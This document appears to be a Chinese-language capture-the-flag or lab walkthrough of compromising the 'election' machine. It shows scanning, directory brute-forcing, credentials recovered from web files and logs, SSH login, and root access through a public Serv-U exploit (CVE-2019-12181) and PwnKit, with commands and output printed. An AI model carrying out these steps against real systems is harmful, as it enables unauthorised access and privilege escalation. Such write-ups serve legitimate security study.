# 列舉

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.236.211 -- -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

............

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

.............
```

# 目錄爆破

- **從根目錄開始爆破，找到 `phpinfo.php`、`robots.txt`**

	```bash
	┌──(kali㉿kali)-[~/Downloads]
	└─$ feroxbuster -u http://192.168.236.211/ -w /usr/share/wordlists/dirb/common.txt -x php -s 200 -t 50 -d 2
	
	.........
	
	200      GET     1170l     5860w    95440c http://192.168.236.211/phpinfo.php
	200      GET        4l        4w       30c http://192.168.236.211/robots.txt
	
	.........
	
	200      GET       26l      359w    10531c http://192.168.236.211/phpmyadmin/index.php
	
	.........
	```

	![](image/Pasted%20image%2020260618002616.png)

	![](image/Pasted%20image%2020260618002737.png)

>
- **在 `robots.tst` 裡找到一個其中一個目錄 `/election`，從這個目錄繼續嘗試爆破，且因為有找到 `phpinfo.php`，所以指定副檔名 `.php`，`-d 2` 限制只爆破到目錄第 2 層**

	![](image/Pasted%20image%2020260618002858.png)

	```bash
	┌──(kali㉿kali)-[~/Downloads]
	└─$ feroxbuster -u http://192.168.236.211/election/ -w /usr/share/wordlists/dirb/common.txt -x php -s 200 -t 50 -d 2
	
	...........
	
	200      GET        1l      215w     1935c http://192.168.236.211/election/card.php
	
	...........
	
	200      GET      129l      805w     8964c http://192.168.236.211/election/admin/index.php
	
	...........
	```

	![](image/Pasted%20image%2020260618003621.png)

	![](image/Pasted%20image%2020260618003656.png)


# 初始存取
- **將  `card.php` 所得到的二進位資料，進行轉換 (兩層轉換)得到 credential**

	![](image/Pasted%20image%2020260620023412.png)
	```bash
	user:1234
	pass:Zxc123!@#
	```
>
- **使用取得的 credential 登入 `/election/admin/index.php`** 

	![](image/Pasted%20image%2020260620024022.png)
>
- 在 `Settings` > `System Info` > `Logging` 裡找到 `system.log`

	![](image/Pasted%20image%2020260620025638.png)
	
	![](image/Pasted%20image%2020260620025815.png)
>
- 使用 `nxc` 驗證，發現 `system.log` 裡的 credential 可以 `ssh` 登入

	```bash
	┌──(kali㉿kali)-[~]
	└─$ nxc ssh 192.168.202.211 -u love -p 'P@$$w0rd@123'
	SSH         192.168.202.211 22     192.168.202.211  [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
	SSH         192.168.202.211 22     192.168.202.211  [+] love:P@$$w0rd@123  Linux - Shell access!
	```
>
- 使用 `ssh` 成功登入，並找到 `local.txt` 

	```bash
	┌──(kali㉿kali)-[~]
	└─$ ssh love@192.168.202.211   
	The authenticity of host '192.168.202.211 (192.168.202.211)' can't be established.
	ED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '192.168.202.211' (ED25519) to the list of known hosts.
	love@192.168.202.211's password: 
	
	..........
	
	love@election:~$ whoami
	love
	love@election:~$ find / -type f -name local.txt 2>/dev/null
	/home/love/local.txt
	```

# 提權
- 執行 `linpeas` 掃描找到以下漏洞

	```bash
	══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
	                      ╚════════════════════════════════════╝
	╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
	
	.........
	
	-rwsr-xr-x 1 root root 6.1M Nov 29  2017 /usr/local/Serv-U  --->  FTP_Server<15.1.7(CVE-2019-12181)/Serv-U
	
	.........
	```
>
- 使用 `searchsploit` 搜尋相關漏洞

	```bash
	┌──(kali㉿kali)-[~/Desktop]
	└─$ searchsploit Serv-U                                   
	------------------------------------------- ---------------------------------
	 Exploit Title                             |  Path
	------------------------------------------- ---------------------------------
	
	........
	
	Serv-U FTP Server < 15.1.7 - Local Privile | linux/local/47009.c
	Serv-U FTP Server < 15.1.7 - Local Privile | multiple/local/47173.sh
	
	........
	```
>
- 下載腳本並在目標端執行，成功取得 `root` 權限，並找到 `proof.txt` 
	
	```bash
	┌──(kali㉿kali)-[~/Desktop]
	└─$ searchsploit -m 47173             
	  Exploit: Serv-U FTP Server < 15.1.7 - Local Privilege Escalation (2)
	      URL: https://www.exploit-db.com/exploits/47173
	     Path: /usr/share/exploitdb/exploits/multiple/local/47173.sh
	    Codes: CVE-2019-12181
	 Verified: False
	File Type: Bourne-Again shell script, ASCII text executable
	Copied to: /home/kali/Desktop/47173.sh
	```
	```bash
	love@election:~$ chmod +x 47173.sh
	love@election:~$ ./47173.sh
	[*] Launching Serv-U ...
	sh: 1: : Permission denied
	[+] Success:
	-rwsr-xr-x 1 root root 1113504 Jun 20 01:15 /tmp/sh
	[*] Launching root shell: /tmp/sh
	sh-4.4# whoami
	root
	sh-4.4# find / -type f -name proof.txt 2>/dev/null
	/root/proof.txt
	```

# 補充
- `linpeas` 其他掃描結果

	```bash
	╔══════════╣ Checking for Copy Fail (CVE-2026-31431) (T1068)
	╚ https://copy.fail/
	╚ https://www.cve.org/CVERecord?id=CVE-2026-31431
	VULNERABLE: non-destructive AF_ALG/splice page-cache write triggered
	```
	```bash
	╔══════════╣ Checking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) (T1068)
	╚ https://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
	╚ https://www.cve.org/CVERecord?id=CVE-2026-43284
	╚ https://www.cve.org/CVERecord?id=CVE-2026-43500
	CVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6
	CVE-2026-43500 (rxrpc): autoloadable: rxrpc
	modprobe mitigation (xfrm-ESP): not found
	modprobe mitigation (rxrpc): not found
	Unprivileged user namespaces: enabled
	Kernel build predates upstream fix (2026-05-08): likely unpatched unless distro backport.
	LIKELY VULNERABLE to CVE-2026-43284 (xfrm-ESP).
	LIKELY VULNERABLE to CVE-2026-43500 (rxrpc).
	```
	```bash
	╔══════════╣ Checking Pkexec and Polkit (T1548.003,T1548.004,T1068)
	╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2
	
	══╣ Polkit Binary (T1548.003,T1068)
	Pkexec binary found at: /usr/bin/pkexec
	Pkexec binary has SUID bit set!
	-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
	pkexec version 0.105
	Potentially vulnerable to CVE-2021-4034 (PwnKit) - check distro patches
	```
	```bash
	╔══════════╣ Checking for PackageKit Pack2TheRoot (CVE-2026-41651) (T1068)
	╚ https://github.security.telekom.com/2026/04/pack2theroot-linux-local-privilege-escalation.html
	PackageKit version detected: 1.1.9
	Vulnerable to CVE-2026-41651 (Pack2TheRoot) - PackageKit 1.1.9 is in the vulnerable range >=1.0.2 <=1.3.4
	```
>
- 其他提權方式
	```bash
	love@election:~$ chmod +x PwnKit
	love@election:~$ ./PwnKit
	root@election:/home/love# whoami
	root
	```
